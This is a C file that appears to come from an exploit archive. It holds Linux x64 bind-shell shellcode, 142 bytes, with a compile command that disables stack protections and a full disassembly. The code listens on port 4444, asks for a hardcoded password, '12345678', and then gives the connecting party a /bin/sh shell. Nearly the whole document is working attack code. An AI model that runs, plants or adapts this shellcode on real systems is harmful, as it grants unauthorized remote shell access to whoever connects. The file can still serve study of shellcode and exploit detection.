/*
 Exploit Title: Linux/x64 - Bind_tcp (0.0.0.0:4444) + Password (12345678) + Shell (/bin/sh) Shellcode (142 bytes)
 Author: Guillem Alminyana
 Date: 2021-01-18
 Platform: GNU Linux x64
 =====================================
 Compile:
   gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x50\x5f\x52\x52\x66\x68"
"\x11\x5c\x66\x6a\x02\x6a\x31\x58\x54\x5e\xb2\x10\x0f\x05\x6a\x32\x58\x6a\x02\x5e"
"\x0f\x05\x6a\x2b\x58\x48\x31\xf6\x99\x0f\x05\x50\x5f\x6a\x02\x5e\x6a\x21\x58\x0f"
"\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41"
"\x51\x48\x89\xe6\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8"
"\x31\x32\x33\x34\x35\x36\x37\x38\x56\x5f\x48\xaf\x75\x1c\x48\x31\xc0\x50\x48\xbb"
"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x50\x54\x5a\x57\x54\x5e\x6a\x3b\x58"
"\x0f\x05";

void main()
{
        printf("ShellCode Lenght: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}

/*
 ASM
   0:	6a 29                	push   0x29
   2:	58                   	pop    rax
   3:	6a 02                	push   0x2
   5:	5f                   	pop    rdi
   6:	6a 01                	push   0x1
   8:	5e                   	pop    rsi
   9:	48 31 d2             	xor    rdx,rdx
   c:	0f 05                	syscall
   e:	50                   	push   rax
   f:	5f                   	pop    rdi
  10:	52                   	push   rdx
  11:	52                   	push   rdx
  12:	66 68 11 5c          	pushw  0x5c11
  16:	66 6a 02             	pushw  0x2
  19:	6a 31                	push   0x31
  1b:	58                   	pop    rax
  1c:	54                   	push   rsp
  1d:	5e                   	pop    rsi
  1e:	b2 10                	mov    dl,0x10
  20:	0f 05                	syscall
  22:	6a 32                	push   0x32
  24:	58                   	pop    rax
  25:	6a 02                	push   0x2
  27:	5e                   	pop    rsi
  28:	0f 05                	syscall
  2a:	6a 2b                	push   0x2b
  2c:	58                   	pop    rax
  2d:	48 31 f6             	xor    rsi,rsi
  30:	99                   	cdq
  31:	0f 05                	syscall
  33:	50                   	push   rax
  34:	5f                   	pop    rdi
  35:	6a 02                	push   0x2
  37:	5e                   	pop    rsi
  38:	6a 21                	push   0x21
  3a:	58                   	pop    rax
  3b:	0f 05                	syscall
  3d:	48 ff ce             	dec    rsi
  40:	79 f6                	jns    38 <loop_1>
  42:	6a 01                	push   0x1
  44:	58                   	pop    rax
  45:	49 b9 50 61 73 73 77 	movabs r9,0x203a647773736150
  4c:	64 3a 20
  4f:	41 51                	push   r9
  51:	48 89 e6             	mov    rsi,rsp
  54:	6a 08                	push   0x8
  56:	5a                   	pop    rdx
  57:	0f 05                	syscall
  59:	48 31 c0             	xor    rax,rax
  5c:	48 83 c6 08          	add    rsi,0x8
  60:	0f 05                	syscall
  62:	48 b8 31 32 33 34 35 	movabs rax,0x3837363534333231
  69:	36 37 38
  6c:	56                   	push   rsi
  6d:	5f                   	pop    rdi
  6e:	48 af                	scas   rax,QWORD PTR es:[rdi]
  70:	75 1c                	jne    8e <exit_program>
  72:	48 31 c0             	xor    rax,rax
  75:	50                   	push   rax
  76:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
  7d:	2f 73 68
  80:	53                   	push   rbx
  81:	54                   	push   rsp
  82:	5f                   	pop    rdi
  83:	50                   	push   rax
  84:	54                   	push   rsp
  85:	5a                   	pop    rdx
  86:	57                   	push   rdi
  87:	54                   	push   rsp
  88:	5e                   	pop    rsi
  89:	6a 3b                	push   0x3b
  8b:	58                   	pop    rax
  8c:	0f 05                	syscall

*/